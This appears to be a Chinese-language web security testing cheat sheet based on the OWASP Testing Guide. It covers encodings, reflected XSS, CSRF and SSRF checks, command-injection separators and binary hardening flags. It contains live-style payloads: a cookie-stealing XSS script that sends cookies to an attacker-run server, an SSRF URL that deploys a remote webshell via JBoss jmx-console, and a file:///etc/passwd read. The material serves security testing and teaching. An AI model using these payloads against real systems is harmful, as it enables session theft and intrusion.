    attack_pattern¶

    OWASP 测试指南 4.0

    特征¶

    • BASE64：包含大小写字母数字+/，以%3D(==)结尾
    • MD5：16字节128bit, 32个十六进制字符
    • SHA1：20字节160bit, 40个十六进制字符，每个十六进制字符代表4bit，40x4=160bit
    • SHA256: 32字节256bit, 64个十六进制字符

    常用编码¶

    • ASCII:

      • 十进制: a = 97
      • 十六进制: / = 0x2F

    • Unicode: 中文 = \u4e2d\u6587

    • 反转义：

      • 回车CR: \r
      • 换行LF: \n
      • 制表符TAB: \t

    • URL:

      • 空格: %20
      • 英文逗号: %2c

    • html:

      • < = &lt;
      • > = &gt;
      • 中文左单引号: &lsquo;
      • 中文右单引号: &rsquo;
      • 中文右双引号: &rdquo;

    XSS¶

    受害场景¶

    XSRF, 以受害者的身份发送请求, 如果受害者是管理员, 可利用创建一个新的管理员帐号供攻击者使用

    反射型¶

    1. 攻击者启动一个http服务器：python -m SimpleHTTPServer 88
    2. 攻击者构造超链接, 请求 URL参数 中注入XSS脚本, 如: http://xxx.com/xxx.action?provider=wiseus&query=<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>&device=mobile&ssid=0&from=844b&uid=0
    3. 诱骗受害者点击该链接
    4. XSS脚本读取Cookies中的SESSIONID(未设置httponly), 并将其发送给攻击者

    验证步骤¶

    只针对非GET请求

    1. 查看请求头/请求体/URL中是否存在 token, 如:

      • roarand: xxx

      删除/修改token 1. 如果对token校验, 尝试 绕过URL白名单: - 跨越上层目录: /logout/../xxx/xxx

    SSRF¶

    验证步骤¶

    • 请求参数中携带endpoint
    • 请求头中携带X-Endpoint

    场景危害¶

    所有场景都可攻击 内网 或 本地

    1. 请求非http服务的端口
      • 返回banner信息，如：http://scanme.nmap.org:22/test.txt返回OpenSSH版本, http://127.0.0.1:3306/test.txt返回MySQL版本.
      • 探测端口开放状态, 如请求关闭的端口: http://scanme.nmap.org:25/test.txt报错.
    2. 正则表达式攻击造成应用程序溢出
      • 如果9876端口开放, 构造http://127.0.0.1:9876/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA使进程崩溃.
    3. 通过访问默认文件, 识别应用
      • http://10.0.0.1/portName.js可以根据返回结果判断是否是 Dlink 路由器.
    4. 访问内网web应用, 构造GET参数实现命令注入, SQL注入, 部署webshell等.
      • http://127.0.0.1/jmx-console/?name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://our_public_internet_server/utils/cmd.war
    5. 请求非http协议, 读取本地文件, 如: file:///etc/passwd。
    6. 间接获取内置帐号token。

    基本模式¶

    1. 使用分隔符拼接cmd1;cmd2, 不论cmd1是否执行成功, cmd2都会执行
    2. 使用管道拼接cmd1|cmd2, 不论cmd1是否执行成功, cmd2都会执行
    3. 使用后台执行符拼接cmd1&cmd2, cmd1后台执行, cmd2不会等待cmd1执行完成
    4. 使用逻辑或操作符拼接cmd1||cmd2, 当cmd1执行失败时, 才会执行cmd2
    5. 使用逻辑与操作符拼接cmd1&&cmd2, 当cmd1执行成功时, 才会执行cmd2
    6. 使用命令替换$(cmd), 将一个命令的执行结果赋值给另一个变量或作为另一个命令的参数, 如USERID=$(uname -a)或echo $(whoami), cmd也可以是符号分割的多条语句
    7. 使用反引号进行命令替换, 如USERID=`id -u`, 等同于$(cmd)
    8. 使用重定向拼接>(cmd)或<(cmd), 注意>和(之间不能有空格, cmd也可以是符号分割的多条语句
    9. 使用换行符拼接cmd1\ncmd2

    安全编译选项¶

    1. 判断二进制文件类型: file xxx

    2. 将readelf拷贝到/usr/bin, readelf -a xxx

      判断是否Go语言应用：Section to Segment mapping中包含.gosymtab .gopclntab字样

      参考链接: golang语言编译的二进制可执行文件为什么比 C 语言大

    3. ./checksec --file=xxx

      1. STACK CANARY: 栈保护(SP), 包含Linux内核态
      2. RELRO: GOT表保护
      3. BIND_NOW: 立即绑定
      4. PIC: 地址无关
      5. PIE: 随机化, Windows平台 DYNAMICBASE
      6. NX: 堆栈不可执行, Windows平台数据执行保护(DEP)
      7. Strip: 删除符号表(Linux可选, Android必选)
      8. Rpath/RunPath: 动态库搜索路径(禁选)
      9. FS: Fortify Source(可选)
      10. Ftrapv: 整数溢出检查(可选)
      11. ASLR: 缓冲区溢出, Windows平台 GS
      12. Visibility: (可选)
      13. Stack Check: (可选)
      14. SAFESEH: Windows平台安全异常处理
